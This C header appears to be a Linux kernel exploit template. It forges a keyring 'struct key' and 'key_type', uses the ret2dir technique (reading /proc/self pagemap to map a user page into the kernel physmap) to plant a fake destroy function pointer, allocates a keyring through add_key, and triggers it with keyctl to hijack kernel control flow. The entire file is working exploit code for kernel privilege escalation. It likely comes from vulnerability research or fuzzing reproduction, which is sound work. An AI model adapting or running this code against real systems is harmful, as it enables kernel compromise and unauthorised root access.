#ifndef _KEY_TMPL_H_
#define _KEY_TMPL_H_

#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>

#define KMALLOC_SIZE 256

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct key {
	char hole1[0x78];
	short state;
	char hole2[0xe];
	void* type;
	char hole3[0x38];
};

struct key_type {
	char* name;
	unsigned long def_datalen;
	void* vet_description;
	void* preparse;
	void* free_preparse;
	void* instantiate;
	void* update;
	void* match_preparse;
	void* match_free;
	void* revoke;
	void* destroy;
	void* describe;
	void* read;
	char hole[0x20];
};

unsigned overwrite_start = 0x88;
unsigned overwrite_end = 0x90;

struct key fake_key;
struct key_type fake_key_type;

void* victim_obj = (void*)&fake_key;

uint64_t kaddr = 0;

void do_setup_physmap() {
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
        memset(&fake_key, 0x00, sizeof(struct key));
		fake_key.state = 1;
        fake_key.type = (void*)kaddr;
        memset(&fake_key_type, 0xff, sizeof(struct key_type));
        fake_key_type.destroy = (void*)0xffffffffdeadbeef;
        memcpy((void*)USER_ADDR, &fake_key_type, sizeof(struct key_type));
    }
	return;
err:
    close(fd);
    exit(-1);
}

uint64_t r[3] = {0xffffffffffffffff, 0x0, 0x0};
void do_alloc_victim() {
  long res = 0;
  memcpy((void*)0x20000000, "keyring", 8);
  memcpy((void*)0x20000080, "syz", 3);
  *(uint8_t*)0x20000083 = 0x23;
  *(uint8_t*)0x20000084 = 0;
  res = syscall(__NR_add_key, 0x20000000, 0x20000080, 0, 0, 0xfffffffc);
  if (res != -1)
    r[1] = res;
}

void do_hijack() {
	memcpy((void*)0x20000000, "keyring", 8);
	keyctl(1, 0x20000000);
}

#endif
